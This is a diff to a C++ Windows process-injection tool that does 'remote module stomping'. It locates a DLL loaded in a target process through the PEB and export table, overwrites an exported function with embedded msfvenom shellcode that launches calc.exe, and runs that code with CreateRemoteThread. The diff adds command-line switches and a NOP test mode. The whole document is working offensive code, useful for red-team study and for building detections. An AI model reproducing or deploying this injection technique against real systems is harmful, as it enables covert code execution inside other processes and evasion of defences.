@@ -1,14 +1,26 @@
 /*
 * remote module stomping: locate a sacrificial DLL in the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
-*                        & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
+* & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
 * compile: cl.exe remote-stomp.cpp ..\includes\peb-eat-utils.cpp ..\includes\utils.cpp /W0
 */
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
 #include "..\includes\peb-eat-utils.h"
 #include "..\includes\utils.h"
+
+void PrintUsage(const char* programName) {
+    printf("[INFO] Usage: %s -p <PID> -d <Target_DLL> -f <Target_Function> [Options]\n", programName);
+    printf("  -p : Target Process ID (PID)\n");
+    printf("  -d : Name of the target DLL (e.g., wininet.dll)\n");
+    printf("  -f : Name of the exported function to stomp (e.g., CommitUrlCacheEntryW)\n");
+    printf("\nOptions:\n");
+    printf("  -n : Enable NOP testing mode (ignores hardcoded shellcode)\n");
+    printf("  -s : Number of NOP bytes to write (required if -n is used)\n");
+}
 
 int main(int argc, char *argv[]) {
     unsigned char buf[] =
@@ -33,50 +45,93 @@ int main(int argc, char *argv[]) {
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-    // Expecting: program.exe <PID> <DLL_Name> <Function_Name>
-    if(argc < 4) {
-        printf("[ERROR] Usage: %s <PID> <Target_DLL> <Target_Function>\n", argv[0]);
-        return -1;
-    }
-
-    // target process ID
     DWORD pid = 0;
+    char* targetDll = NULL;
+    char* targetFunction = NULL;
     
-    pid = my_atoi(argv[1]);
-    if(pid == 0) {
-        printf("[ERROR] Failed to obtain process ID!\n");
+    BOOL nopMode = FALSE;
+    DWORD nopSize = 0;
+
+    unsigned char* writeBuffer = NULL;
+    SIZE_T writeSize = 0;
+
+    // Parse the command line arguments using switches
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
+            pid = my_atoi(argv[++i]);
+        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
+            targetDll = argv[++i];
+        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
+            targetFunction = argv[++i];
+        } else if (strcmp(argv[i], "-n") == 0) {
+            nopMode = TRUE;
+        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
+            nopSize = (DWORD)my_atoi(argv[++i]);
+        } else {
+            printf("[ERROR] Invalid or incomplete argument: %s\n", argv[i]);
+            PrintUsage(argv[0]);
+            return -1;
+        }
+    }
+
+    // Validate that all core fields were filled
+    if (pid == 0 || targetDll == NULL || targetFunction == NULL) {
+        printf("[ERROR] Missing required arguments!\n");
+        PrintUsage(argv[0]);
         return -1;
     }
 
-    char* targetDll = argv[2];
-    char* targetFunction = argv[3];
+    // Validate NOP mode logic rules
+    if (nopMode && nopSize == 0) {
+        printf("[ERROR] NOP mode (-n) enabled, but no size (-s) specified!\n");
+        PrintUsage(argv[0]);
+        return -1;
+    }
+
+    // Handle buffer configuration based on mode selected
+    if (nopMode) {
+        printf("[*] NOP mode active. Generating %u bytes of NOP alignment data.\n", nopSize);
+        writeBuffer = (unsigned char*)malloc(nopSize);
+        if (writeBuffer == NULL) {
+            printf("[ERROR] Memory allocation failed for NOP buffer.\n");
+            return -1;
+        }
+        memset(writeBuffer, 0x90, nopSize);
+        writeSize = nopSize;
+    } else {
+        writeBuffer = buf;
+        writeSize = sizeof buf;
+    }
 
     printf("[*] Running PI with target PID: %u\n", pid);
 
-    // Open a handle to the current process, this must be passed to VirtualAllocEx
+    // Open a handle to the target process
     HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
-    if(pHandle == NULL) {
+    if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
+        if (nopMode) free(writeBuffer);
         return -1;
     }
     printf("[*] Successfully opened handle to PID: %u\n", pid);
   
     PVOID remotePebAddr = GetRemotePebAddress(pHandle);
-    if(!remotePebAddr) {
+    if (!remotePebAddr) {
         printf("[*] ERROR: Failed to find the PEB address. Error %lu\n", GetLastError());
+        CloseHandle(pHandle);
+        if (nopMode) free(writeBuffer);
         return -1;
     }
 
     printf("[*] Target PEB located at: : 0x%016llx\n", remotePebAddr);
     
-    // https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb#remarks
-    // Assuming peb_address holds the valid memory location of the PEB
     PPEB peb_ptr = (PPEB)remotePebAddr;
 
     printf("[*] Attempting to locate the module base for %s.\n", targetDll);
     PVOID targetModuleBase = GetModuleBaseManualRemote(pHandle, peb_ptr, targetDll);
-    if(!targetModuleBase) {
+    if (!targetModuleBase) {
         printf("[ERROR] Failed to locate target module base.\n");
+        CloseHandle(pHandle);
+        if (nopMode) free(writeBuffer);
         return -1;        
     }
 
@@ -85,38 +140,50 @@ int main(int argc, char *argv[]) {
     LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, targetFunction);  
     if (bufferAddress == NULL) {
         printf("[ERROR] Failed to locate target function %s! Error: %lu\n", targetFunction, GetLastError());
+        CloseHandle(pHandle);
+        if (nopMode) free(writeBuffer);
         return -1;
     }
     printf("[*] Target %s!%s located at: 0x%016llx\n", targetDll, targetFunction, bufferAddress);
 
-    printf("[*] Press Enter to write the shellcode to the buffer address: ");
+    printf("[*] Press Enter to write the data to the buffer address: ");
     getchar();
 
     printf("[*] Writing to buffer.\n");
-    // Write the shellcode to the block of memory that we located`
-    BOOL writeShellcode = WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
-    if(writeShellcode == false) {
-        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
+    // Write either the shellcode or the NOP payload to the target area
+    BOOL writePayload = WriteProcessMemory(pHandle, bufferAddress, writeBuffer, writeSize, NULL);
+    if (writePayload == false) {
+        printf("[ERROR] Failed to write data! Using address: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
+        CloseHandle(pHandle);
+        if (nopMode) free(writeBuffer);
         return -1;
     }
 
-    printf("[*] Creating a new thread.\n");
-    // Create a new thread using the shellcode buffer address as the starting point
-    HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
-    if (tHandle == NULL) {
-        printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
-        return -1;
+    // Only invoke thread execution if we are in target shellcode execution mode
+    if (!nopMode) {
+        printf("[*] Creating a new thread.\n");
+        HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, 0, NULL);
+        if (tHandle == NULL) {
+            printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
+            CloseHandle(pHandle);
+            return -1;
+        }
+
+        /*
+        printf("[*] Waiting for the thread to return...\n");
+        WaitForSingleObject(tHandle, INFINITE);
+        */
+        CloseHandle(tHandle);
+    } else {
+        printf("[*] Skipping thread creation (NOP testing mode complete).\n");
     }
 
-    // Wait for the thread to return - not required, but it definitely makes the demonstration much cleaner
-    printf("[*] Waiting for the thread to return...\n");
-    WaitForSingleObject(tHandle, INFINITE);
-
-    // Clean up open handles and free the shellcode buffer memory
+    // Clean up open structures
     CloseHandle(pHandle);
-    CloseHandle(tHandle);
+    if (nopMode) {
+        free(writeBuffer);
+    }
 
-    printf("[*] Process injection complete.\n");
-
+    printf("[*] Process injection operation complete.\n");
     return 0;
 }
